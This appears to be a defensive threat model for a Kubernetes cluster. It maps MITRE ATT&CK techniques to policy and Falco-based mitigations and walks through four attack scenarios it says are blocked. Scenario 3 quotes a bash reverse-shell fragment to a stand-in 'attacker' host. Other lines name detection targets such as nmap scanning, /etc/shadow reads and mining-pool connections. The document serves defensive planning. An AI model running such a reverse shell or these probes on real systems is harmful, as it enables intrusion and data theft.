# Threat Model

## MITRE ATT&CK Mapping

### Initial Access
| Technique | ID | Mitigation |
|-----------|-----|------------|
| Supply Chain Compromise | T1195 | Image scanning, SBOM, signing (Phase 3) |
| Valid Accounts | T1078 | Default SA blocked, RBAC policies (Phase 1) |

### Execution
| Technique | ID | Mitigation |
|-----------|-----|------------|
| Container Administration Command | T1609 | Exec monitoring (Falco), RBAC (Phase 1) |
| Deploy Container | T1610 | Policy enforcement (Phase 1) |

### Privilege Escalation
| Technique | ID | Mitigation |
|-----------|-----|------------|
| Escape to Host | T1611 | 10 Falco rules + hostPath denial (Phase 2) |
| Privileged Container | T1610 | OPA policy blocks (Phase 1) |
| Exploitation for Privilege Escalation | T1068 | Read-only FS, drop capabilities (Phase 1) |

### Defense Evasion
| Technique | ID | Mitigation |
|-----------|-----|------------|
| Impair Defenses | T1562 | Operator namespace isolation (Phase 2) |
| Rootkit | T1014 | Runtime detection (Falco), read-only FS (Phase 1) |

### Credential Access
| Technique | ID | Mitigation |
|-----------|-----|------------|
| Unsecured Credentials | T1552 | Falco monitors /etc/shadow access (Phase 2) |
| Steal Application Access Token | T1528 | SA token automount blocked (Phase 1) |

### Discovery
| Technique | ID | Mitigation |
|-----------|-----|------------|
| Network Service Scanning | T1046 | Falco detects nmap/masscan (Phase 2) |
| Container and Resource Discovery | T1613 | Logged via audit trail (Phase 1) |

### Lateral Movement
| Technique | ID | Mitigation |
|-----------|-----|------------|
| Exploit Public-Facing Application | T1190 | Ingress HTTPS required (Phase 1) |
| Remote Services | T1021 | Zero-trust network (Phase 3) |

### Collection & Exfiltration
| Technique | ID | Mitigation |
|-----------|-----|------------|
| Data from Local System | T1005 | Read-only FS (Phase 1) |
| Exfiltration Over C2 Channel | T1041 | Reverse shell detection (Phase 2) |

### Impact
| Technique | ID | Mitigation |
|-----------|-----|------------|
| Resource Hijacking (Cryptomining) | T1496 | Falco cryptominer detection (Phase 2) |
| Service Stop | T1489 | Pod isolation, RBAC limits (Phases 1 & 2) |

## Attack Scenarios Blocked

### Scenario 1: Container Escape via Privileged Container
**Attacker Goal**: Break out of container to access node

**Attack Steps**:
1. Deploy privileged container
2. Mount host filesystem
3. Access Docker socket
4. Create root container with host PID namespace

**Mitigations**:
- ✅ Step 1 blocked by `deny-privileged-containers` (Phase 1)
- ✅ Step 2 blocked by `deny-host-path` (Phase 1)
- ✅ Step 3 detected by Falco "Docker Socket Access" (Phase 2)
- ✅ Step 4 blocked by `deny-host-namespaces` (Phase 1)

**Result**: Attack prevented at admission (never deployed)

---

### Scenario 2: Cryptominer Deployment
**Attacker Goal**: Deploy cryptominer for resource theft

**Attack Steps**:
1. Deploy container with malicious image
2. Execute cryptominer binary
3. Connect to mining pool (stratum+tcp)

**Mitigations**:
- ⚠️ Step 1: Image from disallowed registry → blocked by `allowed-registries` (Phase 1)
- ✅ Step 2: Cryptominer process detected by Falco (Phase 2)
- ✅ Step 3: Suspicious outbound connection detected → pod isolated (Phase 2)

**Result**: Detected within 5 seconds, auto-remediated

---

### Scenario 3: Reverse Shell from Compromised Pod
**Attacker Goal**: Establish C2 channel

**Attack Steps**:
1. Exploit web application vulnerability
2. Execute reverse shell (bash /dev/tcp/attacker/4444)
3. Escalate to root
4. Pivot to other pods

**Mitigations**:
- ⚠️ Step 1: Application vulnerability (out of scope)
- ✅ Step 2: Bash reverse shell detected by Falco (Phase 2)
- ✅ Step 3: Root blocked by `run-as-nonroot` (Phase 1)
- ✅ Step 4: Lateral movement blocked by zero-trust network (Phase 3)

**Result**: Alert + Forensics within 5 seconds, pod isolated

---

### Scenario 4: Supply Chain Attack via Backdoored Image
**Attacker Goal**: Deploy backdoor via compromised base image

**Attack Steps**:
1. Publish backdoored nginx:latest image
2. Deploy to production

**Mitigations**:
- ✅ Step 1: :latest tag blocked by `block-latest-tag` (Phase 1)
- ✅ Step 2: Unsigned image rejected (Phase 3)
- ✅ Step 2: CVE scan detects malicious package (Phase 3)

**Result**: Deployment blocked, alert sent

---

## Residual Risks

| Risk | Likelihood | Impact | Mitigation Plan |
|------|-----------|--------|-----------------|
| Zero-day kernel exploit | Low | Critical | Keep kernel patched, seccomp blocks rare syscalls |
| Supply chain (signed but backdoored) | Low | High | SBOM analysis for unexpected dependencies |
| Insider threat (cluster-admin) | Low | Critical | Audit all cluster-admin actions, MFA required |
| DDoS against admission webhook | Medium | High | Rate limiting, HA deployment (3 replicas) |

## Compliance Posture

- ✅ **APRA CPS 234**: 22 automated controls
- ✅ **PCI DSS**: Network segmentation, encryption, logging
- ✅ **SOC 2**: Access control, monitoring, change management
- ✅ **NIST CSF**: Identify, Protect, Detect, Respond functions
